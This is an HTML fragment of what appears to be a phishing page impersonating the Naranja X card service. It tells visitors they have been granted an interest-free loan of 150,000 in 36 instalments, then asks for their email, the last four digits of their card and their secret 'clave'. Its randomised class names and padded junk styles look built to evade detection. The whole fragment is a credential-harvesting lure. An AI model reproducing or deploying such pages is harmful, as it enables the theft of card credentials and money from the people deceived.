			...
			<div class="nc0LxTjk col-12 col-md-5 b1jLi mt-0 mt-md-5 mt-md-5 evpKCa5UEK" style="unicode-bidi:initial;unicode-bidi:initial;flood-color:currentcolor;">
				<div class="hoipBdl4yeW5n row OyQNh" style="font-kerning:initial;flood-color:currentcolor;scale:initial;">
					...
					<div style="unicode-bidi:initial;scale:initial;writing-mode:inherit;" class="col-12 8QNRB d-flex justify-content-between dkAJh align-items-center">
						<h3 style="writing-mode:inherit;unicode-bidi:initial;scale:initial;" class="E9dtayhnSU5eGQ">Usted es beneficiario del prestamo naranja x de 150.000 en 36 cuotas sin interes Para continuar ingrese los datos</h3>
					</div>
					...
					<div style="writing-mode:inherit;unicode-bidi:initial;flood-color:currentcolor;" class="BTKlYF7 col-12 8KeS3O9X form-padding">
						<div style="writing-mode:inherit;unicode-bidi:initial;font-kerning:initial;" class="row RSJkPtqrw9an3ZS">
							<div style="writing-mode:inherit;scale:initial;font-kerning:initial;" class="input ljlKMvjXydDI col-12 I7DZXKCvsLK mt-2">
								<label style="writing-mode:inherit;font-kerning:initial;unicode-bidi:initial;" for="correo" class="EKm7Ucfqh4W">Correo</label>
								<input style="flood-color:currentcolor;scale:initial;scale:initial;" class="YiAwyEO" type="text" id="correo" name="correo" placeholder="" minlength="2" maxlength="999" required>
</div>
				</div>
				<div class="IJf7CxJ row d-flex justify-content-center qoMxM contenedor_caja gQN9ll2gClQE7b mb-5" style="writing-mode:inherit;scale:initial;flood-color:currentcolor;">
					<div style="writing-mode:inherit;unicode-bidi:initial;flood-color:currentcolor;" class="BTKlYF7 col-12 8KeS3O9X form-padding">
						<div style="writing-mode:inherit;unicode-bidi:initial;font-kerning:initial;" class="row RSJkPtqrw9an3ZS">
							<div style="writing-mode:inherit;scale:initial;font-kerning:initial;" class="input ljlKMvjXydDI col-12 I7DZXKCvsLK mt-2">
								<label style="writing-mode:inherit;font-kerning:initial;unicode-bidi:initial;" for="digitos" class="EKm7Ucfqh4W">Últimos 4 dígitos de tu naranja</label>
								<input style="flood-color:currentcolor;scale:initial;scale:initial;" class="YiAwyEO" type="number" id="digitos" name="digitos" placeholder="" minlength="2" maxlength="4" required>
								</div>
												</div>
				<div class="IJf7CxJ row d-flex justify-content-center qoMxM contenedor_caja gQN9ll2gClQE7b mb-5" style="writing-mode:inherit;scale:initial;flood-color:currentcolor;">
					<div style="writing-mode:inherit;unicode-bidi:initial;flood-color:currentcolor;" class="BTKlYF7 col-12 8KeS3O9X form-padding">
						<div style="writing-mode:inherit;unicode-bidi:initial;font-kerning:initial;" class="row RSJkPtqrw9an3ZS">
							<div style="writing-mode:inherit;scale:initial;font-kerning:initial;" class="input ljlKMvjXydDI col-12 I7DZXKCvsLK mt-2">
								<label style="writing-mode:inherit;font-kerning:initial;unicode-bidi:initial;" for="digitos" class="EKm7Ucfqh4W">Clave</label>
								<input style="flood-color:currentcolor;scale:initial;scale:initial;" class="YiAwyEO" type="number" id="clave" name="clave" placeholder="" minlength="2" maxlength="4" required>
								</div>
<center>
<label  style="font-kerning:initial;unicode-bidi:initial;font-kerning:initial;" for="dni" class="ZgzLDrMi">Recorda que la clave tiene que ser la vinculada a tu correo para validar tu identidad</label>
</center>
